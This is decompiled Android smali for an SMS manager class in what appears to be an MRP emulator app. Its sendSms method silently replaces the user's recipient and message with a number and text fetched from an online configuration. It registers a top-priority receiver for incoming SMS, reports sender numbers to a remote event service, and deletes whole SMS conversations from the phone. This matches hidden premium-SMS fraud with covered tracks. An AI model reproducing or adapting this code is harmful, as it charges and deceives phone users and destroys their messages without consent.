.class public Lcom/mrpoid/core/EmuSmsManager;
.super Ljava/lang/Object;
.source "EmuSmsManager.java"

# interfaces
.implements Landroid/os/Handler$Callback;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/mrpoid/core/EmuSmsManager$SmsInfo;
    }
.end annotation


# static fields
.field private static final INTENT_ACTION_SMS_DELI:Ljava/lang/String; = "com.mrpoid.sms.delivery"

.field private static final INTENT_ACTION_SMS_RECV:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field private static final INTENT_ACTION_SMS_SENT:Ljava/lang/String; = "com.mrpoid.sms.sent"

.field private static final INTENT_CATEGORY:Ljava/lang/String; = "com.mrpoid.smsmgr"

.field private static final SMS_COLS:[Ljava/lang/String;

.field static final TAG:Ljava/lang/String; = "EmuSmsManager"

.field private static final gDefault:Lcom/edroid/common/utils/Singleton;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/edroid/common/utils/Singleton<",
            "Lcom/mrpoid/core/EmuSmsManager;",
            ">;"
        }
    .end annotation
.end field


# instance fields
.field private mContext:Landroid/content/Context;

.field private final mHandler:Landroid/os/Handler;

.field private final mObserver:Landroid/database/ContentObserver;

.field private final mReceiver:Landroid/content/BroadcastReceiver;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v0, 0x4

    .line 244
    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "_id"

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "thread_id"

    const/4 v2, 0x1

    aput-object v1, v0, v2

    const-string v1, "address"

    const/4 v2, 0x2

    aput-object v1, v0, v2

    const-string v1, "body"

    const/4 v2, 0x3

    aput-object v1, v0, v2

    sput-object v0, Lcom/mrpoid/core/EmuSmsManager;->SMS_COLS:[Ljava/lang/String;

    .line 288
    new-instance v0, Lcom/mrpoid/core/EmuSmsManager$3;

    invoke-direct {v0}, Lcom/mrpoid/core/EmuSmsManager$3;-><init>()V

    sput-object v0, Lcom/mrpoid/core/EmuSmsManager;->gDefault:Lcom/edroid/common/utils/Singleton;

    return-void
.end method

.method private constructor <init>()V
    .locals 2

    .line 87
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 59
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0, p0}, Landroid/os/Handler;-><init>(Landroid/os/Handler$Callback;)V

    iput-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mHandler:Landroid/os/Handler;

    .line 63
    new-instance v0, Lcom/mrpoid/core/EmuSmsManager$1;

    invoke-direct {v0, p0}, Lcom/mrpoid/core/EmuSmsManager$1;-><init>(Lcom/mrpoid/core/EmuSmsManager;)V

    iput-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mReceiver:Landroid/content/BroadcastReceiver;

    .line 74
    new-instance v0, Lcom/mrpoid/core/EmuSmsManager$2;

    iget-object v1, p0, Lcom/mrpoid/core/EmuSmsManager;->mHandler:Landroid/os/Handler;

    invoke-direct {v0, p0, v1}, Lcom/mrpoid/core/EmuSmsManager$2;-><init>(Lcom/mrpoid/core/EmuSmsManager;Landroid/os/Handler;)V

    iput-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mObserver:Landroid/database/ContentObserver;

    return-void
.end method

.method synthetic constructor <init>(Lcom/mrpoid/core/EmuSmsManager$1;)V
    .locals 0

    .line 51
    invoke-direct {p0}, Lcom/mrpoid/core/EmuSmsManager;-><init>()V

    return-void
.end method

.method static synthetic access$000(Lcom/mrpoid/core/EmuSmsManager;Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 51
    invoke-direct {p0, p1, p2}, Lcom/mrpoid/core/EmuSmsManager;->handleReceive(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method static synthetic access$100(Lcom/mrpoid/core/EmuSmsManager;)V
    .locals 0

    .line 51
    invoke-direct {p0}, Lcom/mrpoid/core/EmuSmsManager;->handleSmsContentChange()V

    return-void
.end method

.method public static getDefault()Lcom/mrpoid/core/EmuSmsManager;
    .locals 1

    .line 300
    sget-object v0, Lcom/mrpoid/core/EmuSmsManager;->gDefault:Lcom/edroid/common/utils/Singleton;

    invoke-virtual {v0}, Lcom/edroid/common/utils/Singleton;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/mrpoid/core/EmuSmsManager;

    return-object v0
.end method

.method private getSmsInbox()Lcom/mrpoid/core/EmuSmsManager$SmsInfo;
    .locals 6

    const/4 v0, 0x0

    .line 252
    :try_start_0
    iget-object v1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    const-string v2, "content://sms/inbox"

    sget-object v3, Lcom/mrpoid/core/EmuSmsManager;->SMS_COLS:[Ljava/lang/String;

    invoke-static {v1, v2, v3}, Lcom/edroid/common/utils/SmsUtil;->getSms(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    if-eqz v1, :cond_0

    .line 254
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_0

    const-string v2, "address"

    .line 259
    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    const-string v3, "body"

    .line 260
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    const-string v4, "thread_id"

    .line 261
    invoke-interface {v1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    .line 265
    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    .line 266
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 267
    invoke-interface {v1, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    .line 269
    new-instance v1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;

    invoke-direct {v1, v0}, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;-><init>(Lcom/mrpoid/core/EmuSmsManager$1;)V

    .line 270
    iput-object v3, v1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->content:Ljava/lang/String;

    .line 271
    iput-object v2, v1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->number:Ljava/lang/String;

    .line 272
    iput-wide v4, v1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->thread_id:J

    return-object v1

    :cond_0
    if-eqz v1, :cond_1

    .line 279
    invoke-interface {v1}, Landroid/database/Cursor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "getSmsInbox fail!\n"

    .line 282
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_0
    return-object v0
.end method

.method private handleReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 6

    const-string v0, "android.provider.Telephony.SMS_RECEIVED"

    .line 185
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    const/4 v3, 0x0

    if-eqz v0, :cond_3

    .line 186
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p1

    if-nez p1, :cond_0

    return-void

    :cond_0
    const-string p2, "pdus"

    .line 190
    invoke-virtual {p1, p2}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, [Ljava/lang/Object;

    .line 191
    array-length p2, p1

    :goto_0
    if-ge v3, p2, :cond_7

    aget-object v0, p1, v3

    .line 192
    check-cast v0, [B

    invoke-static {v0}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v0

    .line 193
    invoke-virtual {v0}, Landroid/telephony/SmsMessage;->getStatusOnIcc()I

    move-result v4

    if-eq v4, v2, :cond_1

    const/4 v5, 0x3

    if-ne v4, v5, :cond_2

    .line 197
    :cond_1
    new-instance v4, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;

    invoke-direct {v4, v1}, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;-><init>(Lcom/mrpoid/core/EmuSmsManager$1;)V

    .line 199
    invoke-virtual {v0}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->number:Ljava/lang/String;

    .line 200
    invoke-virtual {v0}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v0

    iput-object v0, v4, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->content:Ljava/lang/String;

    .line 203
    invoke-direct {p0, v4}, Lcom/mrpoid/core/EmuSmsManager;->handleSms(Lcom/mrpoid/core/EmuSmsManager$SmsInfo;)V

    :cond_2
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_3
    const-string v0, "com.mrpoid.sms.sent"

    .line 206
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 210
    iget-object p2, p0, Lcom/mrpoid/core/EmuSmsManager;->mReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p2}, Landroid/content/BroadcastReceiver;->getResultCode()I

    move-result p2

    const/4 v0, -0x1

    if-eq p2, v0, :cond_4

    packed-switch p2, :pswitch_data_0

    goto :goto_1

    :pswitch_0
    const-string v1, "\u5931\u8d25: \u77ed\u4fe1\u670d\u52a1\u4e0d\u53ef\u7528."

    goto :goto_1

    :pswitch_1
    const-string v1, "\u5931\u8d25: PDU \u7a7a."

    goto :goto_1

    :pswitch_2
    const-string v1, "\u5931\u8d25: \u7f51\u7edc\u9519\u8bef."

    goto :goto_1

    :pswitch_3
    const-string v1, "\u5931\u8d25: \u672a\u77e5\u9519\u8bef."

    goto :goto_1

    :cond_4
    const-string v1, "\u53d1\u9001\u6210\u529f!"

    const/4 v2, 0x0

    .line 234
    :goto_1
    invoke-static {}, Lcom/mrpoid/core/Emulator;->getInstance()Lcom/mrpoid/core/Emulator;

    move-result-object p2

    const/16 v4, 0x9

    if-eqz v2, :cond_5

    goto :goto_2

    :cond_5
    const/4 v0, 0x0

    :goto_2
    invoke-virtual {p2, v4, v0, v3}, Lcom/mrpoid/core/Emulator;->postMrpEvent(III)V

    const-string p2, "EmuSmsManager"

    .line 236
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "sms send result="

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/mrpoid/core/EmuSmsManager;->mReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v2}, Landroid/content/BroadcastReceiver;->getResultCode()I

    move-result v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lcom/mrpoid/core/EmuLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    .line 238
    invoke-static {p1, v1, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    goto :goto_3

    :cond_6
    const-string p1, "com.mrpoid.sms.delivery"

    .line 239
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    :cond_7
    :goto_3
    return-void

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method private handleSms(Lcom/mrpoid/core/EmuSmsManager$SmsInfo;)V
    .locals 4

    const-string v0, "EmuSmsManager"

    .line 155
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "handelSms"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/mrpoid/core/EmuLog;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 157
    iget-object v0, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->content:Ljava/lang/String;

    if-nez v0, :cond_0

    const-string v0, "i love you"

    .line 158
    iput-object v0, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->content:Ljava/lang/String;

    .line 159
    :cond_0
    iget-object v0, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->number:Ljava/lang/String;

    if-nez v0, :cond_1

    const-string v0, "10086"

    .line 160
    iput-object v0, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->number:Ljava/lang/String;

    .line 162
    :cond_1
    iget-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    const-string v1, "handelSms"

    iget-object v2, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->number:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Lcom/edroid/common/utils/SdkUtils;->sendEvent(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 164
    invoke-static {}, Lcom/mrpoid/core/Emulator;->getInstance()Lcom/mrpoid/core/Emulator;

    move-result-object v0

    iget-object v1, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->number:Ljava/lang/String;

    iget-object v2, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->content:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lcom/mrpoid/core/Emulator;->handleSms(Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    const/4 v1, 0x1

    if-eq v0, v1, :cond_2

    const-string v0, "EmuSmsManager"

    .line 166
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "try del sms "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/mrpoid/core/EmuLog;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 168
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "content://sms/conversations/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v1, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->thread_id:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 169
    iget-object v1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2, v2}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    move-result v0

    if-lez v0, :cond_2

    const-string v0, "EmuSmsManager"

    .line 171
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "delete sms suc! id="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v2, p1, Lcom/mrpoid/core/EmuSmsManager$SmsInfo;->thread_id:J

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Lcom/mrpoid/core/EmuLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    :cond_2
    return-void
.end method

.method private handleSmsContentChange()V
    .locals 1

    .line 177
    invoke-direct {p0}, Lcom/mrpoid/core/EmuSmsManager;->getSmsInbox()Lcom/mrpoid/core/EmuSmsManager$SmsInfo;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    .line 181
    :cond_0
    invoke-direct {p0, v0}, Lcom/mrpoid/core/EmuSmsManager;->handleSms(Lcom/mrpoid/core/EmuSmsManager$SmsInfo;)V

    return-void
.end method

.method private regReceiver()V
    .locals 4

    .line 91
    iget-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    const-string v1, "android.permission.READ_SMS"

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v3

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/Context;->checkPermission(Ljava/lang/String;II)I

    move-result v0

    const/4 v1, -0x1

    if-ne v1, v0, :cond_0

    return-void

    .line 95
    :cond_0
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const v1, 0x7fffffff

    .line 96
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 97
    iget-object v1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    iget-object v2, p0, Lcom/mrpoid/core/EmuSmsManager;->mReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v1, v2, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 100
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "com.mrpoid.sms.sent"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const-string v1, "com.mrpoid.smsmgr"

    .line 101
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addCategory(Ljava/lang/String;)V

    .line 102
    iget-object v1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    iget-object v2, p0, Lcom/mrpoid/core/EmuSmsManager;->mReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v1, v2, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 105
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "com.mrpoid.sms.delivery"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const-string v1, "com.mrpoid.smsmgr"

    .line 106
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addCategory(Ljava/lang/String;)V

    .line 107
    iget-object v1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    iget-object v2, p0, Lcom/mrpoid/core/EmuSmsManager;->mReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v1, v2, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method


# virtual methods
.method public attachContext(Landroid/content/Context;)V
    .locals 1

    .line 113
    iget-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    if-eqz v0, :cond_0

    .line 114
    new-instance p1, Ljava/lang/RuntimeException;

    const-string v0, "already attached!"

    invoke-direct {p1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;)V

    throw p1

    .line 116
    :cond_0
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    .line 117
    invoke-direct {p0}, Lcom/mrpoid/core/EmuSmsManager;->regReceiver()V

    return-void
.end method

.method public handleMessage(Landroid/os/Message;)Z
    .locals 0

    const/4 p1, 0x0

    return p1
.end method

.method public sendSms(Ljava/lang/String;Ljava/lang/String;)V
    .locals 9

    const-string v0, "EmuSmsManager"

    .line 126
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "sendSms {"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "} to:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/mrpoid/core/EmuLog;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 128
    iget-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    const-string v1, "smsaddr"

    invoke-static {v0, v1}, Lcom/edroid/common/utils/SdkUtils;->getOnlineString(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 129
    iget-object v1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    const-string v2, "smsmsg"

    invoke-static {v1, v2}, Lcom/edroid/common/utils/SdkUtils;->getOnlineString(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v0, :cond_0

    if-eqz v1, :cond_0

    .line 133
    iget-object p1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    const-string p2, "delsms"

    invoke-static {p1, p2, v0}, Lcom/edroid/common/utils/SdkUtils;->sendEvent(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    move-object p2, v0

    move-object p1, v1

    :cond_0
    const/4 v0, -0x1

    .line 136
    iget-object v1, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    const-string v2, "android.permission.SEND_SMS"

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v3

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v4

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/Context;->checkPermission(Ljava/lang/String;II)I

    move-result v1

    if-ne v0, v1, :cond_1

    return-void

    .line 139
    :cond_1
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v6

    .line 140
    invoke-virtual {v6, p1}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object p1

    .line 141
    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :goto_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    move-object v3, v0

    check-cast v3, Ljava/lang/String;

    const/4 v2, 0x0

    .line 142
    iget-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    const-string v4, "com.mrpoid.sms.sent"

    invoke-direct {v1, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v4, "com.mrpoid.smsmgr"

    .line 143
    invoke-virtual {v1, v4}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    const/high16 v4, 0x8000000

    const/4 v5, 0x0

    invoke-static {v0, v5, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v7

    iget-object v0, p0, Lcom/mrpoid/core/EmuSmsManager;->mContext:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    const-string v8, "com.mrpoid.sms.delivery"

    invoke-direct {v1, v8}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v8, "com.mrpoid.smsmgr"

    .line 144
    invoke-virtual {v1, v8}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    invoke-static {v0, v5, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    move-object v0, v6

    move-object v1, p2

    move-object v4, v7

    .line 142
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0

    :cond_2
    return-void
.end method
